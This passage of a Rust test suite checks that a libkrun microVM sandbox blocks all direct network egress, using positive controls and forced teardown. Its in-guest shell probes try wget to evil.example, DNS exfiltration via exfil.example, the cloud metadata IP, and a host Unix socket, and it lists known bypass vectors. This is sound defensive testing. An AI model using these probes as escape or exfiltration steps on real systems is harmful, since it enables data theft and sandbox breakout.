//! KME2 runtime deny proof for the krun (libkrun/TSI microVM) backend.
//!
//! The krun execute path runs its VMM inside a deny-by-default network
//! namespace. Under libkrun TSI the guest's `connect()`/`sendto()` are host
//! sockets issued by the VMM process, so a netns around the VMM confines the
//! guest's egress to the namespace's only outbound path: a host-side egress PEP
//! bound on the bridge gateway. This test proves that a guest attempting direct
//! external egress with no reachable proxy gets a route failure.
//!
//! It is gated behind both `#[ignore]` and an asserted `/dev/kvm` precondition.
//! The krun execute path is admitted only through the KME4 readiness gate. The
//! pinned runtime harness runs explicitly on real KVM hardware as root; a host
//! that cannot enter that lane fails instead of reporting a skipped proof as
//! passed.
//!
//! Teardown never relies on guest exit: a one-shot TSI guest that holds an
//! ESTABLISHED connection hangs VM teardown, so the harness kills the VMM and
//! releases the persistent netns under hard timeouts.

use std::env;
use std::fs;
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::{Duration, Instant};

use futures::executor::block_on;
use tempfile::TempDir;

use nimbus_core::TenantId;
use nimbus_egress::{EgressPolicy, EgressProtocol, EgressRule};
use nimbus_sandbox::backends::container::{
    ContainerSandboxBackend, ContainerSandboxBackendConfig, ContainerStartMode,
};
use nimbus_sandbox::backends::krun::{KrunSandboxBackend, KrunSandboxBackendConfig, KrunStartMode};
use nimbus_sandbox::{
    SandboxBackend, SandboxBackendKind, SandboxId, SandboxMountSpec, SandboxOwnerSpec,
    SandboxProcessSpec, SandboxRootSpec, SandboxSpec,
};

#[path = "support/provision.rs"]
mod provision_support;
use provision_support::{provision_container, provision_krun};

const RESULT_VOLUME: &str = "krun-egress-proof";
const RESULT_PATH_IN_GUEST: &str = "/nimbus-egress/result";
const GRACEFUL_STOP_TIMEOUT: Duration = Duration::from_secs(5);
const FORCE_CMD_TIMEOUT_SECS: u64 = 10;

#[test]
#[ignore = "requires a Linux root host with /dev/kvm, crun(krun), conmon, buildah, netavark, aardvark-dns, and OCI image pull; the runtime deny proof is gated behind the KME4 execute fail-close lift"]
fn krun_execute_mode_denies_direct_external_egress() {
    assert_egress_proof_preconditions();

    let (temp_dir, workdir) = test_workdir("krun-direct-egress");

    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15300));
    let tenant_id = TenantId::new("krun-egress-proof").expect("tenant id should parse");
    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());
    let target =
        env::var("NIMBUS_KRUN_EGRESS_TARGET").unwrap_or_else(|_| "http://1.1.1.1".to_owned());
    let command = format!(
        "if (unset HTTP_PROXY http_proxy HTTPS_PROXY https_proxy ALL_PROXY all_proxy NO_PROXY no_proxy; wget -T 4 -q -O /tmp/nimbus-egress-body {target:?}); then echo allowed > {RESULT_PATH_IN_GUEST}; else echo denied > {RESULT_PATH_IN_GUEST}; fi; sleep 30"
    );
    let spec = SandboxSpec::new(
        tenant_id.clone(),
        SandboxOwnerSpec::standalone_named("krun-deny-direct-egress"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([command]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ));

    let provisioned = provision_krun(&backend, &workdir.join("state"), spec, false)
        .expect("krun phases should activate once execute mode is enabled (KME4)");
    assert!(provisioned.ingress.is_empty());
    let handle = provisioned.handle;

    // The guard force-tears-down on scope exit AND on panic: it never blocks on
    // guest exit, killing the VMM and releasing the netns under hard timeouts.
    let _teardown = ForceTeardownGuard::new(
        backend.clone(),
        handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant_id, &handle.id),
    );

    let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
    let result = wait_for_result(
        &result_path,
        Duration::from_secs(25),
        "krun direct-egress proof result",
    );

    assert_eq!(
        result.trim(),
        "denied",
        "a krun guest with no reachable egress proxy must get a route failure inside the deny-by-default network namespace"
    );

    drop(temp_dir);
}

/// Cross-substrate parity proof: ONE egress policy enforced through the krun PEP
/// and the container PEP must yield byte-identical allow/deny. The policy allows
/// a single internal upstream and denies everything else — `evil.example` and an
/// `unlisted_upstream` (a second host port NOT in the allowlist, i.e. a policy
/// deny). This is a *policy* denial, not tenant isolation: cross-sandbox/tenant
/// PEP isolation is proven separately by
/// `krun_guest_cannot_reach_a_sibling_tenants_pep`.
///
/// `allowed_internal=allowed` is the built-in positive control: an all-denied
/// result from a simply-offline guest cannot masquerade as containment.
///
/// Gated behind `#[ignore]` + `/dev/kvm`; boots a real libkrun guest and a real
/// container as root.
#[test]
#[ignore = "requires a Linux root host with /dev/kvm plus the full krun + container OCI runtime stack; boots a real guest and container to prove PEP allow/deny parity"]
fn krun_and_container_pep_enforce_identical_allow_deny() {
    assert_egress_proof_preconditions();

    // One allowed internal upstream plus one unlisted upstream (a second host
    // port the policy does not allow) that also stands in for `evil.example`.
    let allowed = TestHttpServer::start("allowed-body");
    let unlisted = TestHttpServer::start("unlisted-body");

    // ONE policy drives both substrates.
    let policy = parity_policy(allowed.addr.port());

    let krun_result = run_krun_parity_probe(&policy, allowed.addr.port(), unlisted.addr.port());
    let container_result =
        run_container_parity_probe(&policy, allowed.addr.port(), unlisted.addr.port());

    // Byte-identical allow/deny across the two PEPs is the parity guarantee.
    assert_eq!(
        krun_result, container_result,
        "krun PEP and container PEP must yield byte-identical allow/deny for one policy"
    );
    assert_result_line(&krun_result, "allowed_internal=allowed");
    assert_result_line(&krun_result, "evil_denied=denied");
    assert_result_line(&krun_result, "unlisted_upstream=denied");
    // L15: the SAME allowlisted host+port is denied on a non-allowlisted PATH,
    // proving the PEP narrows on L7 method/path, not just host.
    assert_result_line(&krun_result, "narrowed_path=denied");
}

fn run_krun_parity_probe(policy: &EgressPolicy, allowed_port: u16, unlisted_port: u16) -> String {
    let (_temp_dir, workdir) = test_workdir("krun-parity");
    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15400));
    let tenant_id = TenantId::new("krun-parity-tenant").expect("tenant id should parse");
    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());
    let spec = SandboxSpec::new(
        tenant_id.clone(),
        SandboxOwnerSpec::standalone_named("krun-parity-probe"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([parity_probe_command(allowed_port, unlisted_port)]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ))
    .with_egress_policy(policy.clone());

    let provisioned = provision_krun(&backend, &workdir.join("state"), spec, false)
        .expect("krun phases should activate once execute mode is enabled (KME4)");
    assert!(provisioned.ingress.is_empty());
    let handle = provisioned.handle;
    let teardown = ForceTeardownGuard::new(
        backend.clone(),
        handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant_id, &handle.id),
    );

    let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
    let result = wait_for_result(
        &result_path,
        Duration::from_secs(60),
        "krun parity probe result",
    );
    // Force-tear-down the guest while the workdir still backs the netns.
    drop(teardown);
    normalize_result(&result)
}

fn run_container_parity_probe(
    policy: &EgressPolicy,
    allowed_port: u16,
    unlisted_port: u16,
) -> String {
    let (_temp_dir, workdir) = test_workdir("container-parity");
    let backend = ContainerSandboxBackend::new(container_parity_config(&workdir, 15500));
    let tenant_id = TenantId::new("container-parity-tenant").expect("tenant id should parse");
    let image = env::var("NIMBUS_CONTAINER_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker.io/library/busybox:latest".to_owned());
    let spec = SandboxSpec::new(
        tenant_id.clone(),
        SandboxOwnerSpec::standalone_named("container-parity-probe"),
        SandboxBackendKind::Container,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([parity_probe_command(allowed_port, unlisted_port)]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ))
    .with_egress_policy(policy.clone());

    let provisioned = provision_container(&backend, &workdir.join("state"), spec, false)
        .expect("container phases should activate the parity workload");
    assert!(provisioned.ingress.is_empty());
    let handle = provisioned.handle;
    let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
    let result = wait_for_result(
        &result_path,
        Duration::from_secs(40),
        "container parity probe result",
    );
    let _ = block_on(backend.stop(&handle.id));
    let _ = block_on(backend.remove_tenant_artifacts(tenant_id));
    normalize_result(&result)
}

fn parity_policy(allowed_port: u16) -> EgressPolicy {
    EgressPolicy::new([EgressRule::new(
        "parity-allowed-internal",
        EgressProtocol::Http,
        "127.0.0.1",
        allowed_port,
    )
    .with_methods(["GET"])
    .with_path_prefixes(["/allowed"])
    .allow_internal_ips(true)])
}

fn parity_probe_command(allowed_port: u16, unlisted_port: u16) -> String {
    // ONE line, `;`-joined, no newlines/comments: the krun guest workload path
    // mangles multi-line `sh -c` scripts (proven — a multi-line body yields
    // `n:: not found` / `syntax error` in-guest and never writes a result).
    // `allowed_internal` is the positive control (must be ALLOWED through the
    // PEP, so an all-denied false-green from an offline guest cannot pass);
    // `evil_denied` and `unlisted_upstream` must be DENIED by policy. Every
    // probe is hard-bounded by `timeout`.
    format!(
        r#"TMP=/nimbus-egress/result.tmp; : > "$TMP"; if timeout 6 wget -T 5 -q -O /tmp/allowed "http://127.0.0.1:{allowed_port}/allowed" && grep -q allowed-body /tmp/allowed; then echo allowed_internal=allowed >> "$TMP"; else echo allowed_internal=denied >> "$TMP"; fi; if timeout 6 wget -T 5 -q -O /tmp/evil "http://evil.example/"; then echo evil_denied=allowed >> "$TMP"; else echo evil_denied=denied >> "$TMP"; fi; if timeout 6 wget -T 5 -q -O /tmp/unlisted "http://127.0.0.1:{unlisted_port}/allowed"; then echo unlisted_upstream=allowed >> "$TMP"; else echo unlisted_upstream=denied >> "$TMP"; fi; if timeout 6 wget -T 5 -q -O /tmp/narrow "http://127.0.0.1:{allowed_port}/forbidden"; then echo narrowed_path=allowed >> "$TMP"; else echo narrowed_path=denied >> "$TMP"; fi; mv "$TMP" {RESULT_PATH_IN_GUEST}; sleep 30"#
    )
}

fn normalize_result(result: &str) -> String {
    let mut lines: Vec<&str> = result
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .collect();
    lines.sort_unstable();
    lines.join("\n")
}

fn assert_result_line(results: &str, expected: &str) {
    assert!(
        results.lines().any(|line| line == expected),
        "expected result line {expected:?}, got:\n{results}"
    );
}

fn container_parity_config(workdir: &Path, first_port: u16) -> ContainerSandboxBackendConfig {
    let mut config = ContainerSandboxBackendConfig::under_root(workdir);
    config.start_mode = ContainerStartMode::Execute;
    config.conmon_path = default_existing_path("/usr/bin/conmon", "conmon");
    config.runtime_path = default_existing_path("/usr/bin/crun", "crun");
    config.buildah_path = default_existing_path("/usr/bin/buildah", "buildah");
    config.netavark_path = env::var_os("NIMBUS_NETAVARK")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/lib/podman/netavark", "netavark"));
    config.aardvark_dns_path = env::var_os("NIMBUS_AARDVARK_DNS")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/lib/podman/aardvark-dns", "aardvark-dns"));
    config.use_buildah_unshare = false;
    config.published_port_range = first_port..=first_port + 20;
    config.start_timeout = Duration::from_secs(30);
    config
}

struct TestHttpServer {
    addr: SocketAddr,
}

impl TestHttpServer {
    fn start(body: &'static str) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").expect("parity upstream should bind");
        let addr = listener
            .local_addr()
            .expect("parity upstream address should resolve");
        thread::spawn(move || {
            while let Ok((mut stream, _)) = listener.accept() {
                let mut request = [0_u8; 1024];
                let _ = stream.read(&mut request);
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(response.as_bytes());
            }
        });
        Self { addr }
    }
}

fn assert_egress_proof_preconditions() {
    // SAFETY: geteuid has no preconditions and does not dereference pointers.
    let is_root = unsafe { libc::geteuid() } == 0;
    let kvm_access = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/kvm")
        .map(drop);
    validate_egress_proof_preconditions(is_root, kvm_access)
        .unwrap_or_else(|message| panic!("{message}"));
}

fn validate_egress_proof_preconditions(
    is_root: bool,
    kvm_access: std::io::Result<()>,
) -> Result<(), String> {
    if !is_root {
        return Err(
            "KVM proof precondition failed: run as root to create persistent network namespaces; \
             an explicitly selected ignored provider test must fail, never report a skipped lane \
             as passed"
                .to_owned(),
        );
    }
    kvm_access.map_err(|error| {
        format!(
            "KVM proof precondition failed: /dev/kvm must exist and be readable/writable to boot \
             a libkrun microVM ({error}); an explicitly selected ignored provider test must fail, \
             never report a skipped lane as passed"
        )
    })
}

#[test]
fn explicit_kvm_proof_preconditions_fail_instead_of_skipping() {
    let not_root = validate_egress_proof_preconditions(false, Ok(()))
        .expect_err("a non-root proof host must fail");
    assert!(not_root.contains("run as root"));
    assert!(not_root.contains("must fail, never report a skipped lane as passed"));

    let no_kvm = validate_egress_proof_preconditions(
        true,
        Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "synthetic missing KVM",
        )),
    )
    .expect_err("a host without usable KVM must fail");
    assert!(no_kvm.contains("/dev/kvm must exist and be readable/writable"));
    assert!(no_kvm.contains("synthetic missing KVM"));

    validate_egress_proof_preconditions(true, Ok(()))
        .expect("a root host with usable KVM may enter the live proof");
}

fn egress_backend_config(workdir: &Path, first_port: u16) -> KrunSandboxBackendConfig {
    let mut config = KrunSandboxBackendConfig::under_root(workdir);
    config.start_mode = KrunStartMode::Execute;
    config.runtime_path = env::var_os("NIMBUS_KRUN_EGRESS_RUNTIME")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/libexec/nimbus/crun", "crun"));
    config.conmon_path = env::var_os("NIMBUS_KRUN_EGRESS_CONMON")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/bin/conmon", "conmon"));
    config.buildah_path = env::var_os("NIMBUS_KRUN_EGRESS_BUILDAH")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/bin/buildah", "buildah"));
    config.netavark_path = env::var_os("NIMBUS_NETAVARK")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/lib/podman/netavark", "netavark"));
    config.aardvark_dns_path = env::var_os("NIMBUS_AARDVARK_DNS")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/lib/podman/aardvark-dns", "aardvark-dns"));
    config.use_buildah_unshare = false;
    config.published_port_range = first_port..=first_port + 20;
    config.start_timeout = Duration::from_secs(30);
    config
}

fn test_workdir(name: &str) -> (TempDir, PathBuf) {
    let temp_dir = TempDir::new().expect("temporary workdir should be created");
    let workdir = env::var_os("NIMBUS_KRUN_EGRESS_WORKDIR")
        .map(PathBuf::from)
        .unwrap_or_else(|| temp_dir.path().to_path_buf())
        .join(name);
    fs::create_dir_all(&workdir).expect("egress proof workdir should exist");
    (temp_dir, workdir)
}

fn default_existing_path(preferred: &str, fallback: &str) -> PathBuf {
    let preferred = PathBuf::from(preferred);
    if preferred.exists() {
        preferred
    } else {
        PathBuf::from(fallback)
    }
}

fn tenant_volume_path(workdir: &Path, tenant_id: &TenantId, volume_name: &str) -> PathBuf {
    workdir
        .join("state")
        .join("tenants")
        .join(tenant_id.as_str())
        .join("volumes")
        .join(volume_name)
}

fn sandbox_netns_path(workdir: &Path, tenant_id: &TenantId, sandbox_id: &SandboxId) -> PathBuf {
    workdir
        .join("state")
        .join("tenants")
        .join(tenant_id.as_str())
        .join("networks")
        .join("netns")
        .join(sandbox_id.as_str())
}

fn wait_for_result(path: &Path, timeout: Duration, label: &str) -> String {
    let deadline = Instant::now() + timeout;
    while Instant::now() < deadline {
        if let Ok(contents) = fs::read_to_string(path) {
            return contents;
        }
        thread::sleep(Duration::from_millis(200));
    }
    panic!("timed out waiting for {label} at {}", path.display());
}

/// Force-teardown harness: stop gracefully on a worker thread but never block on
/// guest exit, then kill the VMM and release the persistent netns under hard
/// timeouts. Runs on both the happy path (scope exit) and the panic path.
struct ForceTeardownGuard {
    backend: KrunSandboxBackend,
    sandbox_id: SandboxId,
    netns_path: PathBuf,
}

impl ForceTeardownGuard {
    fn new(backend: KrunSandboxBackend, sandbox_id: SandboxId, netns_path: PathBuf) -> Self {
        Self {
            backend,
            sandbox_id,
            netns_path,
        }
    }
}

impl Drop for ForceTeardownGuard {
    fn drop(&mut self) {
        let stop_handle = {
            let backend = self.backend.clone();
            let sandbox_id = self.sandbox_id.clone();
            thread::spawn(move || {
                let _ = block_on(backend.stop(&sandbox_id));
            })
        };

        let deadline = Instant::now() + GRACEFUL_STOP_TIMEOUT;
        while Instant::now() < deadline && !stop_handle.is_finished() {
            thread::sleep(Duration::from_millis(100));
        }

        if !stop_handle.is_finished() {
            // A one-shot TSI guest holding an ESTABLISHED connection hangs VM
            // teardown; kill the VMM (conmon/crun/krun) hard so the persistent
            // netns can be released.
            run_with_timeout("pkill", &["-9", "-f", self.sandbox_id.as_str()]);
        }

        // Release the persistent netns bind-mount regardless of guest state.
        run_with_timeout("umount", &["-l", &self.netns_path.to_string_lossy()]);
        let _ = fs::remove_file(&self.netns_path);
        let _ = stop_handle.join();
    }
}

fn run_with_timeout(program: &str, args: &[&str]) {
    let _ = Command::new("timeout")
        .arg(FORCE_CMD_TIMEOUT_SECS.to_string())
        .arg(program)
        .args(args)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();
}

/// Every known egress-bypass vector, each of which must resolve to `denied`.
const BYPASS_VECTORS: &[&str] = &[
    "direct_tcp_public",
    "metadata_ip",
    "dns_exfil",
    "loopback_tsi",
    "link_local",
    "ipv6_loopback",
    "ipv4_mapped_private",
    "raw_icmp",
    "af_unix_host",
];

/// KME5 bypass-hardening runtime proof. From inside the krun guest's
/// deny-by-default network namespace, every known egress-bypass vector must be
/// DENIED — direct TCP/UDP to a public IP, DNS-exfil (high-entropy oversized
/// label), the cloud metadata IP, loopback/link-local incl. TSI `127.0.0.1`,
/// IPv6 + IPv4-mapped private, raw/ICMP/AF_PACKET, and AF_UNIX to a host path.
///
/// **Positive control (`pep_allow=allowed`).** BEFORE unsetting the proxy env
/// the probe fetches an allowlisted upstream *through the PEP*, which must
/// succeed. Without it, an all-`=denied` result from a simply-offline guest
/// (no network at all) would masquerade as containment — the false-green this
/// control closes. Then the probe unsets `HTTP_PROXY`, so each denial below is
/// the netns route/caps/mount seam refusing DIRECT egress, not the PEP refusing
/// a proxied request. Cross-sandbox/tenant PEP isolation is proven by
/// `krun_guest_cannot_reach_a_sibling_tenants_pep`; PEP allow/deny parity by
/// `krun_and_container_pep_enforce_identical_allow_deny`.
///
/// Gated behind `#[ignore]` + `/dev/kvm`; boots a real libkrun guest as root.
#[test]
#[ignore = "requires a Linux root host with /dev/kvm plus the full krun OCI runtime stack; boots a real libkrun guest to prove every direct-egress bypass vector is denied"]
fn krun_execute_mode_denies_all_known_bypass_vectors() {
    assert_egress_proof_preconditions();

    // Host loopback sentinel: if the guest's TSI 127.0.0.1 / ::1 ever leaked to
    // the host loopback it would fetch this body. Containment means it cannot.
    let loopback_sentinel = TestHttpServer::start("host-loopback-sentinel");
    let sentinel_port = loopback_sentinel.addr.port();

    // Allowlisted upstream for the positive control: reachable ONLY through the
    // PEP (the policy permits it), proving the guest's network works before the
    // deny vectors run.
    let allowed = TestHttpServer::start("bypass-allow-body");
    let allowed_port = allowed.addr.port();
    let policy = parity_policy(allowed_port);

    let (temp_dir, workdir) = test_workdir("krun-bypass-vectors");
    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15600));
    let tenant_id = TenantId::new("krun-bypass-tenant").expect("tenant id should parse");
    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());
    let public_ip =
        env::var("NIMBUS_KRUN_EGRESS_PUBLIC_IP").unwrap_or_else(|_| "1.1.1.1".to_owned());
    let public_dns =
        env::var("NIMBUS_KRUN_EGRESS_PUBLIC_DNS").unwrap_or_else(|_| "8.8.8.8".to_owned());

    let spec = SandboxSpec::new(
        tenant_id.clone(),
        SandboxOwnerSpec::standalone_named("krun-bypass-vectors"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([bypass_vectors_probe_command(
                &public_ip,
                &public_dns,
                sentinel_port,
                allowed_port,
            )]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ))
    .with_egress_policy(policy);

    let provisioned = provision_krun(&backend, &workdir.join("state"), spec, false)
        .expect("krun phases should activate the bypass-vectors guest");
    assert!(provisioned.ingress.is_empty());
    let handle = provisioned.handle;
    let _teardown = ForceTeardownGuard::new(
        backend.clone(),
        handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant_id, &handle.id),
    );

    let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
    let result = wait_for_result(
        &result_path,
        Duration::from_secs(90),
        "krun bypass-vectors proof result",
    );

    // Positive control first: a simply-offline guest would fail THIS, so an
    // all-denied result can no longer masquerade as containment.
    assert_result_line(&result, "pep_allow=allowed");
    for vector in BYPASS_VECTORS {
        assert_result_line(&result, &format!("{vector}=denied"));
    }

    drop(temp_dir);
}

fn bypass_vectors_probe_command(
    public_ip: &str,
    public_dns: &str,
    sentinel_port: u16,
    allowed_port: u16,
) -> String {
    // A high-entropy DNS label (60 octets, within the 63-octet label limit) that
    // stands in for a DNS-tunnel exfil payload.
    let exfil_label = "d0eadbeefc0ffeebadc0de0123456789abcdef0123456789abcdef0123ab";
    // ONE line, `;`-joined, no newlines/comments: the krun guest workload path
    // mangles multi-line `sh -c` scripts. `pep_allow` (through the still-set PEP
    // env) is the positive control. After `unset`, every vector tests DIRECT
    // egress and must be denied by the netns route/caps/mount seam. Every probe
    // is hard-bounded by `timeout`. The AF_UNIX probe attempts the connect
    // unconditionally (no `[ -S ]` short-circuit) so an absent socket path is a
    // real `denied`, not a silently skipped test.
    format!(
        r#"TMP=/nimbus-egress/result.tmp; : > "$TMP"; if timeout 6 wget -T 5 -q -O /tmp/pepok "http://127.0.0.1:{allowed_port}/allowed" && grep -q bypass-allow-body /tmp/pepok; then echo pep_allow=allowed >> "$TMP"; else echo pep_allow=denied >> "$TMP"; fi; unset HTTP_PROXY http_proxy HTTPS_PROXY https_proxy ALL_PROXY all_proxy NO_PROXY no_proxy; if timeout 6 wget -T 4 -q -O /tmp/pub "http://{public_ip}/"; then echo direct_tcp_public=allowed >> "$TMP"; else echo direct_tcp_public=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/meta "http://169.254.169.254/latest/meta-data/"; then echo metadata_ip=allowed >> "$TMP"; else echo metadata_ip=denied >> "$TMP"; fi; if timeout 6 nslookup "{exfil_label}.exfil.example" {public_dns} >/dev/null 2>&1; then echo dns_exfil=allowed >> "$TMP"; else echo dns_exfil=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/lo "http://127.0.0.1:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/lo; then echo loopback_tsi=allowed >> "$TMP"; else echo loopback_tsi=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/ll "http://169.254.0.1/"; then echo link_local=allowed >> "$TMP"; else echo link_local=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/v6 "http://[::1]:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/v6; then echo ipv6_loopback=allowed >> "$TMP"; else echo ipv6_loopback=denied >> "$TMP"; fi; if timeout 6 wget -T 4 -q -O /tmp/v4m "http://[::ffff:10.0.0.1]/"; then echo ipv4_mapped_private=allowed >> "$TMP"; else echo ipv4_mapped_private=denied >> "$TMP"; fi; if timeout 6 ping -c 1 -W 4 {public_ip} >/dev/null 2>&1; then echo raw_icmp=allowed >> "$TMP"; else echo raw_icmp=denied >> "$TMP"; fi; if timeout 6 nc -U /run/nimbus/host.sock </dev/null >/dev/null 2>&1; then echo af_unix_host=allowed >> "$TMP"; else echo af_unix_host=denied >> "$TMP"; fi; mv "$TMP" {RESULT_PATH_IN_GUEST}; sleep 30"#
    )
}

/// Audit H1 proof: a guest cannot egress through a *sibling* sandbox's PEP.
///
/// The shared bridge places every execute-mode sandbox's PEP on the same
/// gateway address at a distinct port. The netns deny is route-based, so the
/// on-link gateway is reachable on any port — without the per-sandbox egress
/// pin a guest could open a connection to a sibling sandbox's PEP
/// (`gateway:other_port`) and egress under that sibling's policy and injected
/// credentials. This test stands up TWO real execute-mode sandboxes of one
/// tenant that share the bridge: sibling `B` publishes its own injected proxy
/// URL, then `A` proves it can still reach its OWN PEP (positive control — the
/// pin does not break legitimate egress) but CANNOT reach `B`'s PEP. (Isolating
/// two *tenants* on the shared bridge is the separate M1 concern.)
///
/// Gated behind `#[ignore]` + `/dev/kvm` + root like the other krun runtime
/// proofs; it boots two real libkrun guests on KVM hardware.
#[test]
#[ignore = "requires a Linux root host with /dev/kvm plus the full krun OCI runtime stack; boots two libkrun guests to prove sibling-PEP isolation"]
fn krun_guest_cannot_reach_a_sibling_tenants_pep() {
    assert_egress_proof_preconditions();

    // One shared upstream both tenants' policies permit. The pin — not policy —
    // is what must make A's reach through B's PEP fail, so B would happily
    // forward to this upstream if A could reach it.
    let upstream = TestHttpServer::start("shared-upstream-body");
    let upstream_port = upstream.addr.port();
    let policy = parity_policy(upstream_port);

    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());

    // Both sandboxes share ONE backend / state root, so they share the bridge
    // AND the per-tenant IPAM and PEP-port allocator: distinct on-link IPs and
    // distinct PEP ports on one gateway — exactly the production shape this pin
    // defends. (Two backends with separate IPAM would each allocate the bridge's
    // first address and collide.) Sandbox B and A are two sandboxes of the SAME
    // tenant: the H1 reach this pin closes is one sandbox using ANOTHER
    // sandbox's PEP. Cross-tenant bridge/IPAM isolation is the separate M1
    // concern (per-tenant bridge or one-tenant-per-host).
    let (_temp, workdir) = test_workdir("krun-sibling");
    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15700));
    let tenant = TenantId::new("krun-sibling-tenant").expect("tenant id should parse");
    let b_volume = "krun-egress-proof-b";
    let a_volume = "krun-egress-proof-a";

    // --- Sibling B: bring its PEP up and publish the injected proxy URL, then
    // stay alive so the PEP keeps listening while A probes it.
    let b_spec = SandboxSpec::new(
        tenant.clone(),
        SandboxOwnerSpec::standalone_named("krun-sibling-b"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image.clone()),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([format!(
                r#"printf '%s' "$HTTP_PROXY" > {RESULT_PATH_IN_GUEST}; sleep 300"#
            )]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(b_volume, "/nimbus-egress"))
    .with_egress_policy(policy.clone());

    let b_provisioned = provision_krun(&backend, &workdir.join("state"), b_spec, false)
        .expect("sibling B provision phases should activate");
    assert!(b_provisioned.ingress.is_empty());
    let b_handle = b_provisioned.handle;
    let _b_teardown = ForceTeardownGuard::new(
        backend.clone(),
        b_handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant, &b_handle.id),
    );

    let b_proxy_path = tenant_volume_path(&workdir, &tenant, b_volume).join("result");
    let b_proxy_url = wait_for_result(
        &b_proxy_path,
        Duration::from_secs(25),
        "sibling B injected proxy url",
    )
    .trim()
    .to_owned();
    assert!(
        b_proxy_url.starts_with("http://"),
        "sibling B must publish its injected PEP url, got {b_proxy_url:?}"
    );

    // --- Sandbox A: reaches its OWN PEP, but not B's.
    let a_spec = SandboxSpec::new(
        tenant.clone(),
        SandboxOwnerSpec::standalone_named("krun-sibling-a"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([sibling_reach_probe_command(&b_proxy_url, upstream_port)]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(a_volume, "/nimbus-egress"))
    .with_egress_policy(policy);

    let a_provisioned = provision_krun(&backend, &workdir.join("state"), a_spec, false)
        .expect("sandbox A provision phases should activate");
    assert!(a_provisioned.ingress.is_empty());
    let a_handle = a_provisioned.handle;
    let _a_teardown = ForceTeardownGuard::new(
        backend.clone(),
        a_handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant, &a_handle.id),
    );

    let a_result_path = tenant_volume_path(&workdir, &tenant, a_volume).join("result");
    let a_result = wait_for_result(
        &a_result_path,
        Duration::from_secs(60),
        "sandbox A sibling-reach result",
    );

    // Positive control: the pin must NOT break A's own legitimate egress.
    assert_result_line(&a_result, "own_pep=allowed");
    // The H1 guarantee: A cannot egress through sibling B's PEP.
    assert_result_line(&a_result, "sibling_pep_reach=denied");
}

fn sibling_reach_probe_command(sibling_proxy_url: &str, upstream_port: u16) -> String {
    // ONE line, `;`-joined, no `#` comments and no apostrophes: the krun guest
